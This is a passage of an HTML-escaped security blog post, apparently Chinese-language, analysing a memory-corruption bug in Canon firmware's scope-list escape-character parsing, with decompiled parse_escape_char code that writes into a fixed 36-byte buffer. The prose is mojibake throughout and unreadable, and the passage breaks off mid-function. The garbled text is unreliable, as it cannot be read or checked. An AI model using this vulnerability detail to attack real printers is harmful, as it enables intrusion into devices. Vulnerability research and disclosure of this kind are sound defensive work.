&lt;p&gt;‰∏ªË¶ÅÊòØÈï∑Â∫¶(Length)ÂèäÊï∏ÂÄº(Value)ÁöÑÁµÑÂêàÔºåÈÄöÂ∏∏Âú® Parse ÈÄôÁ®ÆÊ†ºÂºèÔºåÂæàÂÆπÊòìÂá∫ÂïèÈ°åÔºåÈúÄË¶ÅÁâπÂà•Ê≥®ÊÑèÔºåËÄåÂØ¶Èöõ‰∏ä Canon Âú® Parse ÈÄôÂÄãÁµêÊßãÊôÇÂ∞±Âá∫‰∫ÜÂïèÈ°å„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;vulnerability&quot;&gt;Vulnerability&lt;/h4&gt;
&lt;p&gt;Canon Âú® parse scope list ÊôÇÔºåÊúÉÂ∞áË∑≥ËÑ´Â≠óÂÖÉËΩâÊèõÊàê ASCIIÔºå‰æãÂ¶Ç &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\41&lt;/code&gt; ÊúÉËΩâÊèõÊàê &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;A&lt;/code&gt; ÔºåÁÑ∂ËÄåÈÄôÂÄãÁ∞°ÂñÆËΩâÊèõÊúÉÊúâÊÄéÊ®£ÁöÑÂïèÈ°åÂë¢? ÊàëÂÄë‰æÜÁúã‰∏Ä‰∏ã Pseudo code&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;parse_scope_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(...){&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;36&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;max&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;34&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;parse_escape_char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(...,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;max&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Â¶Ç‰∏äÈù¢Á®ãÂºèÁ¢ºÊâÄÁ§∫ÔºåÂú® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;parse_scope_list&lt;/code&gt; ‰∏≠ÔºåÊúÉÂÖàÂàÜÈÖç 36 bytes ÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;destbuf&lt;/code&gt; ‰∏¶‰∏îÊåáÂÆöÊúÄÂ§ßÂ§ßÂ∞è 34 Âà∞ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;parse_escape_char&lt;/code&gt; ‰∏≠ÔºåÈÄôÈÇäÊ≤íÁîöÈ∫ºÂïèÈ°åÔºåËÆìÊàëÂÄë‰æÜÁúã‰∏Ä‰∏ã &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;parse_escape_char&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;parse_escape_char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pdata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_WORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pdatalen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_WORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;max&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r7&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r9&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r8&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r11&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r5&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r6&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r1&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r1&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// cc&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r2&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// cc&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pdata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pdatalen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;,&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;\\&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//----------------------[1]&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;0&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v15&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;0&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;0&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v15&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;A&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v15&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;a&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;0&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;0&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;A&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;a&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x37&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//-------------------[2]&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v20&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;55&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xF&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span 